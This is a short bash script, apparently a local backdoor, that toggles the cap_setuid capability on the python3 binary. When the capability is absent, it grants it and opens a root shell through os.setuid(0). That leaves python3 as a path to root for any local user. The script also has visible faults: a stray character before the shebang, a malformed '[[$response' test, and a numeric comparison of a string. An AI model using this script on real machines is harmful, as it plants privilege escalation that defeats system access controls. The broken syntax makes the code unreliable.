i#!/bin/bash

# execute with root user

pathFile=`readlink -f $(which python3)`

if [ -f "$pathFile" ]; then
   response=`getcap $pathFile | awk '{ print $2}'`;
   if [[$response -eq "cap_setuid=ep" ]]; then
      setcap -r $pathFile
      echo "DELETE capability"
      exit 0
   else
      setcap cap_setuid+ep $pathFile
      $pathFile -c 'import os; os.setuid(0); os.system("/bin/bash")'
   fi
else
   echo "Python3 no existe";
fi
